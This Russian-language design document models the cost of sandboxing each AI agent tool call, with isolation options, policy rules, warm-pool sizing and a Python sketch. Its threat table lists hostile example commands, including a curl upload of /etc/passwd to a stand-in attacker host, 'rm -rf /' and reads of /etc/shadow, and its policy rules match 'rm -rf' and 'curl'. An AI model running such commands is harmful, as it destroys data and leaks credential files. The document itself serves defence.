# Sandbox Strategy: Cost & Performance Model

> **Дата:** 5 июня 2026  
> **Контекст:** Анализ стоимости sandbox per-request vs per-session.  
>   Sync PEP gate + Event Bus + Sandbox per tool call.  
> **Статус:** Архитектурное решение, зафиксированное после сессии.

---

## 1. Ключевое различие: Session vs Request

**Session — Identity + Context. Sandbox — Isolation.**

```
Session (Gateway):
  who:      agent "deploy-bot"
  key:      vk_xxx
  team:     "infra"
  context:  { project: "frontend", env: "staging" }
  rate_limit: 100 calls/min
  state:    connection, auth, history

Sandbox (per request):
  what:     bash "npm run build"
  network:  isolated
  fs:       read-only /src, write /tmp
  timeout:  60s
  memory:   512MB
  lifecycle: create → execute → destroy (один call)
```

**Sandbox — не для сессии. Sandbox — для одного tool call'а.**

---

## 2. Спектр sandbox'ов (от дешёвого к дорогому)

```
Слабая изоляция ←──────────────────────────────────→ Сильная изоляция
(дёшево)                                                (дорого)

Landlock+seccomp → Docker(warm) → gVisor → Firecracker
```

| Sandbox | Setup latency | RAM overhead | CPU overhead | Безопасность |
|---------|-------------|-------------|-------------|-------------|
| **Landlock + seccomp** | **~1ms** | **~2MB** | ~0% | Process-level isolation |
| **Docker (cold start)** | ~200-500ms | ~50MB/container | ~0% | OS-level isolation |
| **Docker (warm pool)** | **~10-50ms** | ~50MB/container в pool | ~0% | OS-level isolation |
| **gVisor** | ~100-200ms | ~50-100MB | ~10-20% | App kernel isolation |
| **Firecracker** | ~150-300ms | ~100-200MB | ~1-5% | MicroVM isolation |
| **WASM sandbox** | **~1-5ms** | **~5-10MB** | ~0% | Capability-based |

---

## 3. Выбор sandbox'а per-policy (не per-server)

**Каждый call получает sandbox в зависимости от policy, agent, tool, args.**

```
Policy rules:
  tool == "read_file" AND agent == "trusted-dev"      → NO SANDBOX (direct exec)
  tool == "read_file" AND agent == "untrusted"        → Landlock sandbox
  tool == "bash"                                       → Landlock sandbox
  tool == "bash" AND args CONTAINS "rm -rf"           → Docker sandbox
  tool == "bash" AND args CONTAINS "curl"             → Docker sandbox (network isolation)
  agent == "deploy-bot" AND env == "production"       → Docker sandbox (всегда)
  tool == "kubectl"                                    → Docker sandbox + audit
  tool == "npm install"                                → Docker sandbox (network, no persist)
```

### Распределение в production (реалистичное):
- **70%** → No sandbox (read-only safe calls: `ls`, `cat`, `git status`, `read file`)
- **25%** → Landlock + seccomp (safe writes: `npm build`, `pip install`, `git commit`)
- **5%** → Docker warm pool (risky: `rm`, `curl`, `sudo`, `docker`)

---

## 4. Warm Pool — как решается latency для Docker

```
Без warm pool (cold start):
  Вызов → pull image (если нет) → create container → setup network →
  execute → destroy → 200-500ms overhead

С warm pool:
  [background] Pool держит 5-10 готовых containers
  Вызов → checkout из pool (5ms) → execute → return to pool
           ─── 10-20ms overhead ───
```

**Размер pool'а:**
- 10 containers × 50MB = 500MB RAM (постоянно)
- Этого хватает на 50-150 concurrent calls
- Pool пополняется автоматически при падении количества готовых

---

## 5. Cost Model: 1000 tool calls

### Scenario A: Без оптимизации (каждый call в Docker)

```
1000 calls × Docker warm pool:
  Latency:  1000 × 15ms               = 15 секунд overhead
  RAM:      10 containers × 50MB       = 500MB (pool)
  CPU:      15 секунд / час            = 0.4% CPU
```

### Scenario B: С policy-оптимизацией

```
700 calls × NO SANDBOX (safe reads):
  Latency:  700 × 0ms                  = 0ms
  RAM:      0MB
  CPU:      0

250 calls × Landlock + seccomp:
  Latency:  250 × 1ms                  = 250ms
  RAM:      2MB (BPF rules, Landlock)
  CPU:      250ms

50 calls × Docker warm pool:
  Latency:  50 × 15ms                  = 750ms
  RAM:      10 containers × 50MB        = 500MB (pool shared)
  CPU:      750ms

TOTAL:
  Avg latency overhead:                ~1ms/call
  RAM:                                 ~502MB (pool + BPF)
  CPU:                                 ~1.25 sec / 1000 calls (~0.03%)
```

### Scenario C: Deep optimization (policy + cache)

```
800 calls × NO SANDBOX:
  Same as B.

150 calls × Landlock + seccomp:
  Same as B.

50 calls × Docker warm pool:
  Same as B.

+ Semantic cache (повторный вызов не sandbox'ится):
  200 calls = cache hit → 0ms overhead
  800 calls = cache miss → как в B

TOTAL:
  Avg latency overhead:                ~0.8ms/call
  RAM:                                 ~502MB
  CPU:                                 ~1.0 sec / 1000 calls
```

---

## 6. Сравнение с LLM latency

| Метрика | LLM call | Sandbox overhead | Доля |
|---------|---------|-----------------|------|
| GPT-4 response time | ~2000-5000ms | ~1-15ms | **0.05-0.75%** |
| Claude 3 response time | ~1500-4000ms | ~1-15ms | **0.07-1%** |
| Local model (7B) | ~500-2000ms | ~1-15ms | **0.2-3%** |

**Sandbox overhead — статистическая погрешность для LLM агента.**

---

## 7. Что мы покупаем за эту стоимость

| Без sandbox'а (Portkey/LiteLLM) | С sandbox'ом (EPP) |
|--------------------------------|-------------------|
| ❌ Любой `rm -rf /` выполняется | ✅ Изолирован |
| ❌ Любой `curl evil.com --upload /etc/passwd` выполняется | ✅ Blocked (network isolation) |
| ❌ Форк-бомба убивает хост | ✅ Умирает в sandbox'е |
| ❌ Чтение `/etc/shadow` возможно | ✅ Изолированная FS |
| ❌ Нет audit на уровне runtime | ✅ Immutable DAG с sandbox context |
| ❌ After-exploit — доступ ко всем данным | ✅ Sandbox уничтожен |

**Стоимость защиты: ~1ms latency и ~500MB RAM.**

---

## 8. Implementation sketch

```python
class SandboxSelector:
    """Выбирает sandbox strategy per-call на основе policy"""
    
    async def select(self, tool: str, args: dict, agent: str, context: dict) -> SandboxStrategy:
        policy_result = await self.pdp.evaluate({
            "action": "sandbox.select",
            "resource": tool,
            "principal": agent,
            "context": {
                "args": args,
                "env": context.get("env"),
                "team": context.get("team")
            }
        })
        
        strategy_name = policy_result.get("sandbox", "linux_native")
        return self.strategies[strategy_name]

class SandboxPool:
    """Warm pool для контейнеров"""
    
    def __init__(self, min_size=5, max_size=20):
        self.pool = asyncio.Queue()
        self.min_size = min_size
        self.max_size = max_size
        self._maintain_pool()  # background task
    
    async def acquire(self) -> SandboxInstance:
        instance = await self.pool.get()
        if instance.is_alive():
            return instance
        return await self._create_fresh()
    
    async def release(self, instance: SandboxInstance):
        instance.reset()  # clean state
        await self.pool.put(instance)

class SyncPEPGate:
    """Sync PEP — entry point для agent calls"""
    
    async def handle_tool_call(self, request: ToolCallRequest) -> ToolCallResponse:
        agent = await self.authn.verify(request.api_key)
        await self.authz.check(agent, request.tool)
        
        decision = await self.pdp.decide(agent, request.tool, request.args)
        if decision == DENY:
            await self.bus.publish("execution.denied", {...})
            return ToolCallResponse(status=403, error=decision.reason)
        
        sandbox = await self.sandbox_selector.select(
            tool=request.tool,
            args=request.args,
            agent=agent.name,
            context=agent.context
        )
        
        result = await sandbox.run(request.tool, request.args)
        
        await self.bus.publish("execution.completed", {
            "agent": agent.name,
            "tool": request.tool,
            "sandbox": sandbox.name,
            "decision_id": decision.id,
            "result": result,
            "duration_ms": result.duration_ms
        })
        
        return ToolCallResponse(status=200, result=result)
```

---

## 9. Decision Record

| Решение | Выбор |
|---------|-------|
| **Sandbox lifecycle** | **Per-request**, не per-session. Session в gateway. Sandbox — ephemeral runtime. |
| **Sandbox strategy** | **Per-policy**. Не "один на все". Policy решает: no sandbox / Landlock / Docker. |
| **Docker latency** | **Warm pool**. 10-20ms overhead, не 200-500ms. |
| **Default sandbox** | **Landlock + seccomp**. 1ms, 2MB, достаточно для 90% safe calls. |
| **Target distribution** | 70% no sandbox / 25% Landlock / 5% Docker. |
| **RAM для pool'а** | ~500MB (10 containers). Приемлемо для production сервера. |

---

## 10. Итог: стоимость sandbox'а в одном абзаце

**~1ms latency и ~500MB RAM — это цена полной изоляции каждого tool call'а.** 
Для LLM агента, который ждёт ответ 2-5 секунд, **1ms overhead незаметен**. 
Для сервера с 32-64GB RAM, **500MB для pool'а — 1-2% ресурсов**. 

**Sandbox per-request — не дорого. Это best practice для безопасного agent execution.**
